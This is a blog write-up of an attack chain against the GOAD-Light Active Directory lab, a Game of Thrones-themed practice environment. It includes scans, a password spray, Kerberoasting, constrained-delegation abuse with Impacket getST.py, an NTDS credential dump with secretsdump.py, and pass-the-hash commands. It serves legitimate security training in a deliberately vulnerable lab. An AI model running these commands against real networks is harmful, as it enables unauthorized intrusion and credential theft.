---
title: 'AD Pentesting: GOAD Light'
date: 2026-01-14
permalink: /posts/2026-01-14-GOAD-Light/
tags:
  - ActiveDirectory
  - GOAD
  - Pentesting
  - Writeup
  - BloodHound
  - Kerberoasting
---

My walkthrough of [GOAD-Light](https://github.com/Orange-Cyberdefense/GOAD), a lightweight Active Directory pentesting lab built around a Game of Thrones theme. The lab consists of two domain controllers and a SQL server across two domains: `north.sevenkingdoms.local` and `sevenkingdoms.local`.

This was a great lab for practicing a realistic AD attack chain from zero credentials to domain admin.

## Recon

- - -

First step was to nmap the environment. Since this was GOAD-Light, we only had 3 hosts to work with.

**10.4.10.11 — Winterfell (DC1, north.sevenkingdoms.local)**

```
Host is up (0.0022s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-27 20:47:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/wsmans?
Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**10.4.10.22 — CastelBlack (SQL Server, north.sevenkingdoms.local)**

```
Host is up (0.0024s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/wsmans?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**10.4.10.10 — KingsLanding (DC2, sevenkingdoms.local)**

```
Host is up (0.0022s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-27 20:47:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
3268/tcp open  ldap
3269/tcp open  ssl/ldap
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/wsmans?
Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows
```


## Initial SMB Enumeration

- - -

With no credentials yet, the first thing I always try is SMB null and guest authentication. Null auth didn't give much, but guest auth (empty password) was a different story.

![Initial SMB enumeration](/images/goad-light/3_intialsmb.png)

Running through the accessible shares with guest auth, `10.4.10.22` (Castelblack) I found a readable file share containing a note referencing `Arya` — and more importantly, a password: `Needle`.

![SMB shares enumeration](/images/goad-light/4_shares_1.png)

So now I have a password. The problem is I don't know what username to pair it with. I assumed the user's name was `Arya` but was not entirely sure how the usernames were actually formatted. 

## Building a Username List

- - -

Since this is a Game of Thrones themed lab, the user accounts are clearly named after GoT characters. I grabbed a list of character names from a GoT characters [JSON](https://github.com/jeffreylancaster/game-of-thrones/blob/master/data/characters.json) file and piped it through `jq` to extract and sort the names into a flat list.

![Extracting character names from JSON](/images/goad-light/1_get_chars.png)

```bash
cat characters.json | jq -r '.characters[].characterName' | sort -u > characters.txt
```

From there I fed the character list into [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate realistic username permutations (first.last, flast, firstl, etc.) — the kind of formats corporate AD environments actually use.

![Generating username permutations](/images/goad-light/2_anarchy.png)

```bash
./username-anarchy -i ~/HTB/ludus/GOAD-Light/characters.txt > ~/HTB/ludus/GOAD-Light/bruteforce_usernames.txt
```

With the wordlist generated, I ran it through [Kerbrute](https://github.com/ropnop/kerbrute) to validate which usernames actually exist in the domain.

![Kerbrute username enumeration](/images/goad-light/6_kerbrute.png)

This confirmed valid accounts and also revealed the naming convention: `first.last` (e.g. `arya.stark`).

## Getting a Foothold: arya.stark

- - -

Time to try the password `Needle` against `arya.stark`. I once again, nxc to test the credentials accross the network with smb.

![Testing arya.stark credentials](/images/goad-light/5_arya.png)

![arya.stark authentication confirmed](/images/goad-light/7_arya_working.png)

Checking arya's privileges revealed she has local admin rights on both Winterfell and CastelBlack.

![arya.stark is local admin](/images/goad-light/8_arya_local_admin.png)

From here I used her credentials to enumerate domain users:

```bash
nxc smb hosts.txt -u 'arya.stark' -p 'Needle' --users
```

![Enumerating domain users](/images/goad-light/9_winterfell_users.png)

This pulled back a solid list of accounts, including `samwell.tarley`.

## BloodHound

- - -

At this point it was also time to run bloodhound, admittedly I should have done this as soon as I had creds.

After running bloodhound to collect the data and loading it into the BloodHound GUI, the attack paths became clear.

![BloodHound overview](/images/goad-light/10_bloodhound.png)

Arya isn't particularly useful for further domain escalation — she has local admin rights apparently but no interesting AD object permissions. However, two other users stood out.

`samwell.tarley` has a path to Tier Zero (domain admin equivalent):

![Samwell's path to Tier Zero](/images/goad-light/13_shortest_sam.png)

But the most immediately actionable finding: `jon.snow` is Kerberoastable (he has an SPN set) and as a Tier Zero account this basically means that if we can crack the users password, the domain is likely owned.

![Jon Snow is Kerberoastable](/images/goad-light/11_jonkerberoastable.png)

## Kerberoasting Jon Snow

- - -

Kerberoasting works by requesting a service ticket (TGS) for an account with a Service Principal Name. The ticket is encrypted with the account's password hash, which you can then take offline and crack.

Using `arya.stark`'s credentials, I roasted `jon.snow`:

![Kerberoasting results and hash cracking](/images/goad-light/14_kerberoasted.png)

Hashcat cracked the TGS hash and recovered jon's password: `iknownothing`.

## Constrained Delegation

- - -

Back in BloodHound, there was another important property on `jon.snow`: he's allowed to perform constrained delegation to `CIFS` on Winterfell.

![Jon can delegate to CIFS](/images/goad-light/16_jon_can_delegate.png)

I'll be honest, I still dont fully understand this next step, I had to follow Bloodhounds "Abuse" advice.

Constrained delegation means jon's account is trusted to request service tickets on behalf of other users — including Administrator. This is exploitable via an S4U2Self + S4U2Proxy attack using Impacket's `getST.py`.

```bash
getST.py -spn 'cifs/winterfell.north.sevenkingdoms.local' \
  -impersonate Administrator \
  -dc-ip 10.4.10.11 \
  'north.sevenkingdoms.local/jon.snow:iknownothing'
```

The resulting ticket can be added to our cc cache so that we can more easily present it with subsequent Kerberos requests
```bash
export KRB5CCNAME='Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache'
```

Finally (shown in the last step of the screenshot), we can simply use `psexec.py` with the `-k` flag to authenticate to the winterfell DC with this new Kerberos ticket

![Constrained delegation configuration in AD](/images/goad-light/17_constrained_delegation.png)

After poking around with our PS Exec shell, I realized I could also just dump ntds.dit since Impacket's `secretsdump.py` also accepts Kerberos authentication. As a local admin on the DC this should be trivial

## Dumping NTDS

- - -

```bash
secretsdump.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell -just-dc
```
This gives us every user's NT hash in the domain.

![NTDS dump from Winterfell](/images/goad-light/18_ntds_winterfell.png)

Now sitting on a full credential dump of `north.sevenkingdoms.local`. I tested these hashes cross-domain against KingsLanding (`sevenkingdoms.local`) via SMB, LDAP, SSH, RDP, and WinRM nothing landed there. 

### This is a worthwhile callout
As far as I could tell Kingslanding was not set up in GOAD-Light to work with the other hosts and accounts. Since there are no other GOAD Light writeups to reference, I had to assume that the "Light" install did not have the correct configuration to allow further exploitation of Kingslanding

But the SQL server at CastelBlack was still worth a try.

## Lateral Movement to CastelBlack

- - -

Using the hashes from the NTDS dump, I tested them against CastelBlack with NetExec over WinRM:

```bash
nxc winrm 10.4.10.22 -u north_users -H north_hashes
```

![CastelBlack user enumeration via WinRM](/images/goad-light/19_users_castelblack.png)

The Administrator hash worked and came back `Pwn3d!`.

![Administrator access confirmed on CastelBlack](/images/goad-light/20_castel_black_admin.png)

Full admin on CastelBlack. Both the primary DC (Winterfell) and the SQL server (CastelBlack) in `north.sevenkingdoms.local` are fully compromised.

## Summary

- - -

The full attack chain:

1. **SMB guest auth** → found `Needle` password in a readable share
2. **Username enumeration** via GoT character list + username-anarchy + Kerbrute → discovered `first.last` naming convention
3. **Credential spray** → `arya.stark:Needle` valid, local admin on DC1 and CastelBlack
4. **User enumeration** with arya's creds → found `samwell.tarley` and others
5. **BloodHound** → identified kerberoastable `jon.snow` with constrained delegation rights to CIFS on Winterfell
6. **Kerberoasting** → cracked `jon.snow:iknownothing`
7. **Constrained delegation abuse** (S4U2Proxy) → impersonated Administrator on Winterfell CIFS
8. **NTDS dump** → full domain credential dump
9. **Pass-the-hash** to CastelBlack → full admin

GOAD-Light is an excellent lab for practicing a realistic AD attack chain. The GoT theme is fun and the intentional misconfigurations — guest SMB access, kerberoastable service accounts, overly permissive delegation — are representative of what you'll encounter in real environments.
